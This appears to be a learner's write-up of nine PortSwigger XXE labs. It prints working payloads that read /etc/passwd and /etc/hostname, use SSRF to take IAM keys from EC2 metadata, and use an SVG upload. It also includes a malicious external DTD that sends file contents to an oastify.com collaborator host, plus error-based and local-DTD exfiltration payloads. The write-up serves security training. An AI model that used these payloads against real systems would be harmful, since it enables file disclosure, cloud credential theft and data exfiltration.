### 1. Lab: Exploiting XXE using external entities to retrieve files
> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

In this application there is a stock checking functionality. In this functionality if we put the payload of XXE, we can able to retrieve the file we want.
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
![[Pasted image 20250810141321.png]]
> Solution: Using simple XEE payload will solve the lab

### 2. Lab: Exploiting XXE to perform SSRF attacks
> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

In this application, we have to read data from internal server using SSRF with XXE Injection. We will use similar payload as before with a URL instead of local file and we will see the response is exposing a directory `latest`, if we enumerate though directory we will get the credentials.
![[Pasted image 20250810141849.png]]
![[Pasted image 20250810141858.png]]
On writing full URL will give us the credentials we want!
![[Pasted image 20250810141924.png]]
> Solution: Use SSRF Payload with XXE
### 3. Lab: Exploiting XInclude to retrieve files
> This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

This application uses `XInclude` in order to get the file, but the question is how can we know if the website is parsing XML data in backend? We will use `&entity;` to check if it is parsing or not. In this case, it is!
![[Pasted image 20250810142845.png]]
So we will use `XInclude` payload in order to get the file.
![[Pasted image 20250810142815.png]]
> Solution: Use `XInclude` payload to solve the lab

### 4. Lab: Exploiting XXE via image file upload 
> This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

In this application, it is loading svg image in avatar, so we will use XML Injection to upload malicious SVG image.
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY test SYSTEM 'file:///etc/hostname'>]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <g id="glyph1">
    <text font-size="50" x="40" y="30">&test;</text>
  </g>
</svg>
```
![[Pasted image 20250810144245.png]]
> Solution: Using this image, hostname will be rendered in avatar image.

### 5. Lab: Blind XXE with out-of-band interaction
> This lab has a "Check stock" feature that parses XML input but does not display the result.
You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Similar to Lab 2, instead of using Internal URL, we will use burp collaborator URL in order to check if there is any blind XXE Injection.
![[Pasted image 20250810145156.png]]
> Solution: Use collaborator to check blind XXE Injection

### 6. Lab:  Blind XXE with out-of-band interaction via XML parameter entities
> This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

If we use previous payload, the application is blocking us by saying: `"Entities are not allowed for security reasons"`
![[Pasted image 20250810145532.png]]
So we will insert the following external entity definition in between the XML declaration and the `stockCheck` element:
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "https://nmd6zh5g7ue0k6f4ta8i9pzjdaj17uvj.oastify.com"> %xxe; ]>
```
![[Pasted image 20250810145731.png]]
> Solution: Use XML parameter entity payload.

### 7. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
> This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

In order to check XXE Injection, we will see if we are getting anything in burpcollaborator? Yes, with the following payload we are getting blind XXE Injection.
![[Pasted image 20250810152220.png]]
Next we will store the payload on exploit server
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://vnme0p6o82f8legcui9qax0reik984wt.oastify.com/?x=%file;'>">
%eval;
%exfil;
```
![[Pasted image 20250810152411.png]]
And then use the exploit server URL in place of blind XXE Injection and we will get hostname in HTTP request.
![[Pasted image 20250810152423.png]]
> Solution: Use external malicious DTD to exfiltrate data

### 8. Lab: Exploiting blind XXE to retrieve data via error messages
> This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.
The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

We will use similar technique as previous lab, the only difference is in this lab, the errors are being exposed from the backend, so we will leverage that in order to exfiltrate data.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
![[Pasted image 20250810153011.png]]
> Solution: Use error based payload to exfiltrate data

### 9. Lab: Exploiting XXE to retrieve data by repurposing a local DTD
> This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.
You'll need to reference an existing DTD file on the server and redefine an entity from it.

When an application processes XML and you can define entities but can’t retrieve data in-band (no reflection) or out-of-band (egress filtering), you can still leak information by referencing and abusing a local DTD.

The process:
1. **Confirm XXE works** – Inject an entity pointing to a known file like `/etc/passwd`. Different error messages for existing vs non-existent files confirm file access.
2. **Find local DTDs** – Use a wordlist (GoSecure provides a solid one) to brute force common DTD file paths via an XML entity reference. Filter responses for valid hits.
3. **Repurpose existing entities** – Once you find a local DTD (e.g., `fonts.dtd`), check online or in the DTD source for entity definitions you can overwrite.
4. **Trigger error-based exfiltration** – Redefine an existing entity to include your target file’s contents in a resource path that doesn’t exist. The application’s “no such file or directory” error will include the leaked data.
```xml
<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
```
![[Pasted image 20250810154419.png]]
> Solution: This technique is useful when you’ve confirmed XXE but can’t pull data using standard in-band or out-of-band channels. By hijacking entities in a local DTD, you can still get valuable file contents despite strong egress controls.